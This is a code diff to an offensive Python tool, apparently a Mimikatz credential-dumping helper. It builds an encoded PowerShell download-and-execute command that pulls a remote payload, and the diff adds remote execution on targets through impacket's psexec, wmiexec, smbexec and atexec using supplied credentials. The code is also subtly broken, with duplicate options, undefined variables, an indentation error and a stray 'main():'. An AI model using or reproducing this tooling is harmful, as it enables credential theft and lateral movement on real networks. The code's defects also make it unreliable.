@@ -44,6 +44,11 @@ try:
     import netifaces
 except:
     sys.exit("[!] Install the netifaces library: pip install netifaces")
+try:
+    import psexec, wmiexec, smbexec, atexec
+except Exception as e:
+    print("[!] The following error occured %s") % (e)
+    sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
 
 class Obfiscator:
     def __init__(self, src_ip, src_port, payload, function, argument, execution, dst_ip="", dst_port=""):
@@ -69,11 +74,14 @@ class Obfiscator:
         elif "download" in self.execution:
             # Direct downloader
             self.downloader()
+        elif "psexec" in self.execution:
+            # Direct invoker via psexec
+            self.invoker_psexec()
 
     def packager(self, cleartext):
         encoded_utf = cleartext.encode('utf-16-le')
         encoded_base64 = base64.b64encode(encoded_utf)
-        command = "powershell -nop -enc %s" % (encoded_base64)
+        command = "powershell.exe -nop -enc %s" % (encoded_base64)
         return(command)
 
     def invoker(self):
@@ -81,6 +89,19 @@ class Obfiscator:
         # Creates the command iex (New-Object Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
         text = "iex (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
         self.command = self.packager(text)
+
+    def invoker_psexec(self):
+        # Invoke Mimikatz Directly
+        # Creates the command iex (New-Object System.Net.WebClient).DownloadString('http://src_ip:src_port/payload'); function -argument
+        pre = "powershell.exe -Command Set-ExecutionPolicy Unrestricted -Scope CurrentUser; "
+        bit64 = "C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\\"
+        bit32 = "C:\Windows\System32\WindowsPowerShell\\v1.0\\"
+        tail = "PowerShell.exe -Command iex (New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (self.src_ip, self.src_port, self.payload, self.function, self.argument)
+        text64 = bit64 + tail
+        text32 = bit32 + tail
+        text = pre + tail
+        #powershell.exe -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://google.com/robots.txt','c:\robots.txt')}"
+        self.command = text32
 
     def downloader(self):
         # Download String Directly
@@ -135,16 +156,25 @@ def get_networks(gateways_dict):
 
 def main():
     # If script is executed at the CLI
-    usage = '''usage: %(prog)s [-t IP] [-r port] [-p payload.ps1] [-a argument] [-f function] [-c interface] -i -d  -q -v -vv -vvv'''
+    usage = '''usage: %(prog)s [-s IP] [-r port] [-x payload.ps1] [-a argument] [-f function] [-c interface] -i -d  -q -v -vv -vvv'''
     parser = argparse.ArgumentParser(usage=usage)
-    parser.add_argument("-t", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
-    parser.add_argument("-c", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
+    parser.add_argument("-s", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
+    parser.add_argument("-a", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     parser.add_argument("-r", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
-    parser.add_argument("-p", action="store", dest="payload", default=None, help="The name of the Mimikatz file")
+    parser.add_argument("-x", action="store", dest="payload", default=None, help="The name of the Mimikatz file")
     parser.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
     parser.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
     parser.add_argument("-i", "--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
-    parser.add_argument("-d", "--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
+    parser.add_argument("-l", "--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
+    parser.add_argument("-c", "--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
+    parser.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
+    parser.add_argument("-d", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
+    parser.add_argument("-u", action="store", dest="usr", default="Administrator", help="The username that will be used to exploit the system, defaults to administrator")
+    parser.add_argument("-p", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
+    parser.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
+    parser.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
+    parser.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
+    parser.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the invoker process into the system memory with at")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
@@ -156,6 +186,7 @@ def main():
         sys.exit(1)
 
     if (args.payload == None and not args.downloader):
+        print("[!] This script requires either a download based attack or a payload for invokation")
         parser.print_help()
         sys.exit(1)
 
@@ -169,10 +200,38 @@ def main():
     mim_arg = args.mim_arg             # The argument processed by the function
     invoker = args.invoker             # Holds the results for invoker execution
     downloader = args.downloader       # Holds the results for exploit/multi/script/web_delivery
+    smbexec_cmd = args.smbexec_cmd     # Holds the results for smbexec execution
+    wmiexec_cmd = args.wmiexec_cmd     # Holds the results for the wmiexec execution
+    psexec_cmd = args.psexec_cmd       # Holds the results for the psexec execution
+    atexec_cmd = args.atexec_cmd
+    usr = args.usr
+    pwd = args.pwd
+    dom = args.dom
+    target = args.target
+    command = args.command
+	supplement = ""
+
+    if smbexec_cmd or wmiexec_cmd or atexec_cmd:
+        invoker = True
+    if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd:
+        if usr == None or pwd == None:
+            print(2)
+            sys.exit("[!] If you are trying to exploit a system you need a username, password and domain name")
+        if target == None:
+            print(1)
+            sys.exit("[!] If you are trying to exploit a system you need at least one target")
+
+    x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
+
     if invoker:
         execution = "invoker"
+        command = x.return_command()
     elif downloader:
         execution = "downloader"
+        command = x.return_command()
+    elif psexec_cmd:
+        execution = "psexec"
+        command = x.return_command()
     else:
         parser.print_help()
         sys.exit("[!] Please choose to execute either the invoker or the downloader")
@@ -195,12 +254,25 @@ def main():
     instructions = supplement + '''
 [*] Then copy and paste the following command into the target boxes command shell.
 [*] You will have cleartext credentials as long as you have correct privileges and PowerShell access.
-[*] This double encoded script should bypass almost all forms of IPS and it drops no payloads.
+[*] This execution script is double encoded script.
 '''
 
     x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
-    print(instructions)
-    print(x.return_command())
-    print(src_ip)
+    if psexec_cmd:
+        attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, copyFile = None, exeFile = None)
+        attack.run(target)
+    elif wmiexec_cmd:
+        attack=wmiexec.WMIEXEC(test, username = usr, password = pwd, domain = dom)
+        attack.run(target)
+    elif smbexec_cmd:
+        attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom)
+        attack.run(target)
+    elif atexec_cmd:
+        attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
+        attack.play(target)
+    else:
+        print(instructions)
+        print(x.return_command())
+
 if __name__ == '__main__':
-    main()
+    main():
